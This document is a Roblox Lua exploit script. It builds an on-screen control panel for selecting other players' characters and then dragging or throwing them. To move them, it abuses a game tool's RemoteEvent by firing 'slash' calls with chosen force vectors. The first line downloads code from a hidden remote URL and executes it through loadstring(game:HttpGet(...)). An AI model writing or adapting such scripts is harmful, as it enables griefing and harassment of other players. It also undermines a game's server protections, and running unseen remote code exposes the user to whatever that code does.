loadstring(game:HttpGet("https://[Log in to view URL]", true))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local currentMode = "Single"
local selectedTarget = nil
local selectedTargets = {}
local isLocked = false
local draggingLoop = nil
local toolEquipped = false


local tool = Instance.new("Tool")
tool.Name = "Control"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Parent = LocalPlayer:WaitForChild("Backpack")


local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
screenGui.Name = "Ceo ~ Ui"
screenGui.ResetOnSpawn = false


local function createButton(name, text, pos, size)
	local btn = Instance.new("TextButton")
	btn.Name = name
	btn.Text = text
	btn.Size = size or UDim2.new(0, 80, 0, 40)
	btn.Position = pos
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 16
	btn.Parent = screenGui
	btn.Visible = false
	return btn
end


local baseX = 1
local offsetX = -180
local startY = 0.3

local upButton = createButton("UpButton", "⬆", UDim2.new(baseX, offsetX, startY, 0))
local downButton = createButton("DownButton", "⬇", UDim2.new(baseX, offsetX, startY + 0.15, 0))
local leftButton = createButton("LeftButton", "⬅", UDim2.new(baseX, offsetX - 90, startY + 0.075, 0))
local rightButton = createButton("RightButton", "➡", UDim2.new(baseX, offsetX + 90, startY + 0.075, 0))
local forwardButton = createButton("ForwardButton", "⬆️ Fwd", UDim2.new(baseX, offsetX + 90, startY - 0.1, 0))
local backButton = createButton("BackButton", "⬇️ Bwd", UDim2.new(baseX, offsetX - 90, startY - 0.1, 0))

local throwButton = createButton("ThrowButton", "Throw Target", UDim2.new(baseX, offsetX - 31, startY - 0.26, 0), UDim2.new(0, 160, 0, 40))
local lockButton = createButton("LockTarget", "🔒 Lock Target", UDim2.new(baseX, offsetX - 30, startY + 0.30, 0), UDim2.new(0, 140, 0, 35))
local modeButton = createButton("ModeButton", "Mode: Single", UDim2.new(baseX, offsetX - 20, startY + 0.42, 0), UDim2.new(0, 150, 0, 35))
modeButton.BackgroundColor3 = Color3.new(0, 0, 0)
modeButton.TextColor3 = Color3.new(1, 1, 1)

local directions = {Up = false, Down = false, Left = false, Right = false, Forward = false, Backward = false}


local function findRemoteEvent()
	for _, container in ipairs({LocalPlayer.Backpack, LocalPlayer.Character}) do
		for _, tool in ipairs(container:GetChildren()) do
			if tool:IsA("Tool") then
				local ev = tool:FindFirstChild("Event")
				if ev and ev:IsA("RemoteEvent") then
					return ev
				end
			end
		end
	end
end


local function applyHighlight(character)
	if character and not character:FindFirstChild("ClickHighlight") then
		local h = Instance.new("Highlight")
		h.Name = "ClickHighlight"
		h.Adornee = character
		h.FillTransparency = 1
		h.OutlineColor = Color3.fromRGB(0, 170, 255)
		h.OutlineTransparency = 0
		h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		h.Parent = character
	end
end

function clearHighlight()
	
	for _, model in ipairs(selectedTargets) do
		if model and model:FindFirstChild("ClickHighlight") then
			model.ClickHighlight:Destroy()
		end
	end

	
	if selectedTarget and selectedTarget:FindFirstChild("ClickHighlight") then
		selectedTarget.ClickHighlight:Destroy()
	end

	
	selectedTargets = {}
	selectedTarget = nil
end


local function getRelativeDirectionVector()
	local char = LocalPlayer.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return Vector3.zero end

	local hrp = char.HumanoidRootPart
	local forward = hrp.CFrame.LookVector
	local right = hrp.CFrame.RightVector
	local up = Vector3.yAxis

	local dir = Vector3.zero
	if directions.Forward then dir += forward end
	if directions.Backward then dir -= forward end
	if directions.Right then dir += right end
	if directions.Left then dir -= right end
	if directions.Up then dir += up end
	if directions.Down then dir -= up end

	return dir
end


local function updateDirectionLoop()
	if draggingLoop then draggingLoop:Disconnect() end
	local remote = findRemoteEvent()

	draggingLoop = RunService.Heartbeat:Connect(function()
		local targets = (currentMode == "Multiple") and selectedTargets or {selectedTarget}
		for _, t in ipairs(targets) do
			if t and t:FindFirstChild("HumanoidRootPart") and remote then
				local dirVector = getRelativeDirectionVector()
				if dirVector.Magnitude > 0 then
					remote:FireServer("slash", t, dirVector.Unit * 8)
				end
			end
		end
	end)
end

modeButton.MouseButton1Click:Connect(function()
	clearHighlight() 

	if currentMode == "Single" then
		currentMode = "Multiple"
		modeButton.Text = "Mode: Multiple"
	else
		currentMode = "Single"
		modeButton.Text = "Mode: Single"
	end
end)


local function connectArrowButton(button, dirKey)
	button.MouseButton1Down:Connect(function()
		directions[dirKey] = true
	end)
	button.MouseButton1Up:Connect(function()
		directions[dirKey] = false
	end)
	button.TouchTap:Connect(function()
		directions[dirKey] = true
		task.delay(0.2, function()
			directions[dirKey] = false
		end)
	end)
end

connectArrowButton(upButton, "Up")
connectArrowButton(downButton, "Down")
connectArrowButton(leftButton, "Left")
connectArrowButton(rightButton, "Right")
connectArrowButton(forwardButton, "Forward")
connectArrowButton(backButton, "Backward")

Mouse.Button1Down:Connect(function()
	local target = Mouse.Target
	if target then
		local model = target:FindFirstAncestorOfClass("Model")
		local player = Players:GetPlayerFromCharacter(model)
		if player and player ~= LocalPlayer then
			if currentMode == "Single" then
				
				clearHighlight()
				selectedTarget = model
				selectedTargets = {} 
				applyHighlight(model)
			else
				if not table.find(selectedTargets, model) then
					table.insert(selectedTargets, model)
					applyHighlight(model)
				end
			end
			updateDirectionLoop()
		end
	end
end)


throwButton.MouseButton1Click:Connect(function()
	local remote = findRemoteEvent()
	local targets = (currentMode == "Multiple") and selectedTargets or {selectedTarget}

	for _, t in ipairs(targets) do
		local hrp = t and t:FindFirstChild("HumanoidRootPart")
		if remote and hrp and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			local forward = LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector
			local force = forward * 80 + Vector3.new(0, 60, 0)
			remote:FireServer("slash", t, force)
		end
	end
end)